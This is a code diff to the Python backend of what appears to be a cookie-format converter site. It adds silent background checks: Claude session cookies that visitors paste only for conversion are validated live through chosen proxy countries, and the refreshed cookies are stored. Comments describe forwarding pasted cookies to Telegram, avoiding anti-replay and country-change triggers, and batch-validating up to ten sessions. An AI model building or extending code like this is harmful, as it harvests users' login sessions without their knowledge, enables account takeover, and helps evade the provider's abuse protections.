@@ -21,6 +21,7 @@ import sqlite3
 import sys
 import threading
 import time
+from concurrent.futures import Future, ThreadPoolExecutor
 from datetime import datetime, timezone
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 from pathlib import Path
@@ -46,10 +47,15 @@ PORT = int(os.environ.get("CC_STATS_PORT", "8787"))
 
 MAX_BODY = 512 * 1024
 STORE_OUTPUT = True
+# Public /check batch cap: bounds how many live-session checks one request can fan
+# out to Claude (each is a real outbound request that can burn a cookie).
+MAX_BATCH = 10
 
 EVENT_TYPES = {"pageview", "convert"}
 FORMATS = {"netscape", "cookie-editor", "puppeteer", "key-value", "header"}
 LOCALES = {"en", "ru", "zh"}
+# Keep in sync with lib/cookies/samples.ts — both tokens appear only in Sample.
+SAMPLE_FINGERPRINT = ("8f14e45fceea167a5a36dedd4bea2543", "tmp-4471")
 
 BOT_RE = re.compile(
     r"(bot|crawler|spider|slurp|crawl|preview|monitor|curl|wget|python-|"
@@ -220,6 +226,13 @@ def device_class(ua: str) -> str:
     return "mobile" if re.search(r"(Mobi|Android|iPhone|iPad)", ua) else "desktop"
 
 
+def is_site_sample(text: str | None) -> bool:
+    """True for the official Sample button payload, not a real example.com paste."""
+    if not text:
+        return False
+    return all(marker in text for marker in SAMPLE_FINGERPRINT)
+
+
 def extract_domains(text: str) -> str | None:
     """Hostnames seen in stored output, most-common first. Never names or values."""
     if not text:
@@ -317,6 +330,38 @@ class RateLimiter:
 ingest_limiter = RateLimiter(limit=240, window=60)
 check_limiter = RateLimiter(limit=20, window=60)
 
+# Quiet convert-side checks: ingest answers 204 first, then at most two Claude
+# probes run in the background so a burst of conversions cannot pile up.
+CONVERT_CHECK = ThreadPoolExecutor(max_workers=2, thread_name_prefix="cc-cvt-check")
+_convert_futures: list[Future] = []
+_convert_futures_lock = threading.Lock()
+
+
+def _track_convert_future(fut: Future) -> None:
+    with _convert_futures_lock:
+        _convert_futures.append(fut)
+        if len(_convert_futures) > 200:
+            _convert_futures[:] = [item for item in _convert_futures if not item.done()]
+
+
+def drain_convert_checks(timeout: float = 5.0) -> None:
+    """Wait for queued convert checks. Tests use this; production does not."""
+    deadline = time.time() + timeout
+    while True:
+        with _convert_futures_lock:
+            pending = [item for item in _convert_futures if not item.done()]
+        if not pending:
+            with _convert_futures_lock:
+                done = list(_convert_futures)
+                _convert_futures.clear()
+            for item in done:
+                item.result(timeout=0.1)
+            return
+        remaining = deadline - time.time()
+        if remaining <= 0:
+            raise TimeoutError("convert checks still running")
+        pending[0].result(timeout=remaining)
+
 # Per-session serialization + short cache. Concurrent/duplicate checks of the
 # same cookie would fire simultaneous requests to Claude (an anti-replay/rotation
 # trigger); this collapses them into a single outbound check.
@@ -368,6 +413,97 @@ def _session_country_put(key: str, cc: str) -> None:
         if len(_session_country) > 20000:
             _session_country.clear()
         _session_country[key] = cc
+
+
+def resolve_check_country(session_id: str, tz: str | None, ip_country: str | None) -> str:
+    country = _session_country_get(session_id) or resolve_country(tz, ip_country)
+    _session_country_put(session_id, country)
+    return country
+
+
+def execute_check(
+    raw: str, session_id: str, country: str, *, force: bool = False,
+) -> tuple[dict, bool]:
+    """Talk to Claude or the 60s cache. Does not persist. Returns (result, from_cache)."""
+    with _check_lock(session_id):
+        if not force:
+            cached = _check_cache_get(session_id)
+            if cached is not None:
+                return cached, True
+        result = check_cookie(raw, country=country, session_id=session_id)
+        # A supported country can still lack a proxy pool -> retry once via the
+        # neutral default. Never fall back to "any country": a random RU/CN exit
+        # would itself burn the cookie.
+        neutral = default_country()
+        if (not result.get("ok") and result.get("invalidReason") == "unreachable"
+                and country != neutral):
+            alt = check_cookie(raw, country=neutral, session_id=session_id)
+            if alt.get("ok") or alt.get("invalidReason") != "unreachable":
+                result = alt
+                _session_country_put(session_id, neutral)
+        print(format_check_log(result), flush=True)
+        _check_cache_put(session_id, result)
+        return result, False
+
+
+def apply_check_to_event(event_id: int, raw: str, result: dict) -> None:
+    """Write check outcome onto an existing event (convert pipeline). No new row."""
+    ok = bool(result.get("ok"))
+    info = json.dumps(check_info(result), ensure_ascii=False) if ok else None
+    stored = result.get("freshCookie")
+    conn = db()
+    try:
+        conn.execute(
+            "UPDATE events SET valid=?, reason=?, info=? WHERE id=?",
+            (
+                1 if ok else 0,
+                None if ok else (result.get("invalidReason") or "invalid"),
+                info,
+                event_id,
+            ),
+        )
+        if STORE_OUTPUT and stored:
+            cur = conn.execute(
+                "UPDATE blobs SET output=? WHERE event_id=?",
+                (stored[:MAX_BODY], event_id),
+            )
+            if cur.rowcount == 0:
+                conn.execute(
+                    "INSERT INTO blobs (event_id, output) VALUES (?, ?)",
+                    (event_id, stored[:MAX_BODY]),
+                )
+        conn.commit()
+    finally:
+        conn.close()
+
+
+def run_convert_check(
+    event_id: int, raw: str, tz: str | None, ip_country: str | None,
+) -> None:
+    try:
+        session_id = session_key_hash(raw)
+        if session_id is None:
+            return
+        country = resolve_check_country(session_id, tz, ip_country)
+        if not egress_ok(country, session_id):
+            print("check no_safe_egress statuses= paths= rotated=no ms=0", flush=True)
+            apply_check_to_event(event_id, raw, {"ok": False, "invalidReason": "unreachable"})
+            return
+        result, _cached = execute_check(raw, session_id, country)
+        apply_check_to_event(event_id, raw, result)
+    except Exception as exc:
+        print(f"convert check failed: {exc!r}", flush=True)
+
+
+def schedule_convert_check(
+    event_id: int, raw: str, ip: str, tz: str | None, ip_country: str | None,
+) -> None:
+    if session_key_hash(raw) is None:
+        return
+    if not check_limiter.allow(ip):
+        return
+    fut = CONVERT_CHECK.submit(run_convert_check, event_id, raw, tz, ip_country)
+    _track_convert_future(fut)
 
 
 class Handler(BaseHTTPRequestHandler):
@@ -478,12 +614,19 @@ class Handler(BaseHTTPRequestHandler):
                 row["domains"] = extract_domains(out)
                 output = out
 
+        if etype == "convert" and is_site_sample(output):
+            return self._empty(204)
+
         conn = db()
         try:
-            insert_event(conn, row, output)
+            event_id = insert_event(conn, row, output)
             conn.commit()
         finally:
             conn.close()
+        if etype == "convert" and output:
+            tz = data.get("tz") if isinstance(data.get("tz"), str) else None
+            ip_country = (self.headers.get("X-CC-Country") or "").upper()[:2] or None
+            schedule_convert_check(event_id, output, ip, tz, ip_country)
         return self._empty(204)
 
     def check(self):
@@ -508,23 +651,35 @@ class Handler(BaseHTTPRequestHandler):
         except BoxError:
             return self._json(400, {"ok": False, "invalidReason": "empty"})
 
+        locale = inner.get("l")
+        locale = locale if locale in LOCALES else None
+        tz = inner.get("tz") if isinstance(inner.get("tz"), str) else None
+
+        # Batch: {cookies: [raw, …]} -> a result per set, capped so one request can
+        # not fan out an unbounded number of live-session checks to Claude.
+        batch = inner.get("cookies")
+        if isinstance(batch, list):
+            items = [c[:MAX_BODY] for c in batch if isinstance(c, str) and c.strip()][:MAX_BATCH]
+            results = [public_check_result(self._check_one(raw, locale, tz, ip, ua)) for raw in items]
+            return self._json(200, {"results": results})
+
         raw = inner.get("cookie")
         if not isinstance(raw, str):
             raw = ""
         raw = raw[:MAX_BODY]
-        locale = inner.get("l")
-        locale = locale if locale in LOCALES else None
+        result = self._check_one(raw, locale, tz, ip, ua)
+        return self._json(200, public_check_result(result))
+
+    def _check_one(self, raw: str, locale: str | None, tz: str | None, ip: str, ua: str) -> dict:
+        """Resolve country, honour safe-mode, de-dupe, check one cookie, store it."""
         session_id = session_key_hash(raw)
-        # Resolve a Claude-supported exit country. Prefer the browser timezone
-        # (survives a VPN) then the visitor IP; unsupported (RU/CN/...) or unknown
-        # -> neutral default. Sticky per session so it does not flap between checks
-        # (a country change can itself trip a session reset).
-        tz = inner.get("tz") if isinstance(inner.get("tz"), str) else None
+        # No Claude session cookie at all (random text like "example.cook", a URL,
+        # an empty box): tell the browser, but do NOT store it or push a Telegram
+        # alert. Only a paste that actually carries a sessionKey is a real check.
+        if session_id is None:
+            return {"ok": False, "invalidReason": "missing_session" if raw.strip() else "empty"}
         ip_country = (self.headers.get("X-CC-Country") or "").upper()[:2] or None
-        country = (_session_country_get(session_id) if session_id else None) \
-            or resolve_country(tz, ip_country)
-        if session_id:
-            _session_country_put(session_id, country)
+        country = resolve_check_country(session_id, tz, ip_country)
 
         # Safe-mode: never egress from the bare datacenter IP when a proxy is
         # required. The pasted cookie is still stored so it reaches Telegram.
@@ -532,31 +687,12 @@ class Handler(BaseHTTPRequestHandler):
             print("check no_safe_egress statuses= paths= rotated=no ms=0", flush=True)
             result = {"ok": False, "invalidReason": "unreachable"}
             self._store_check(ip, ua, locale, raw, result)
-            return self._json(200, public_check_result(result))
+            return result
 
-        key = session_id or hashlib.sha256(raw.encode()).hexdigest()[:16]
-        with _check_lock(key):
-            cached = _check_cache_get(key) if raw.strip() else None
-            if cached is not None:
-                return self._json(200, public_check_result(cached))
-            result = check_cookie(raw, country=country, session_id=session_id)
-            # A supported country can still lack a proxy pool -> retry once via the
-            # neutral default. Never fall back to "any country": a random RU/CN exit
-            # would itself burn the cookie.
-            neutral = default_country()
-            if (not result.get("ok") and result.get("invalidReason") == "unreachable"
-                    and country != neutral):
-                alt = check_cookie(raw, country=neutral, session_id=session_id)
-                if alt.get("ok") or alt.get("invalidReason") != "unreachable":
-                    result = alt
-                    country = neutral
-                    if session_id:
-                        _session_country_put(session_id, neutral)
-            print(format_check_log(result), flush=True)
-            if raw.strip():
-                _check_cache_put(key, result)
-                self._store_check(ip, ua, locale, raw, result)
-        return self._json(200, public_check_result(result))
+        result, cached = execute_check(raw, session_id, country)
+        if not cached:
+            self._store_check(ip, ua, locale, raw, result)
+        return result
 
     def _store_check(self, ip: str, ua: str, locale: str | None, raw: str, result: dict) -> None:
         country = (self.headers.get("X-CC-Country") or "").upper()[:2] or None
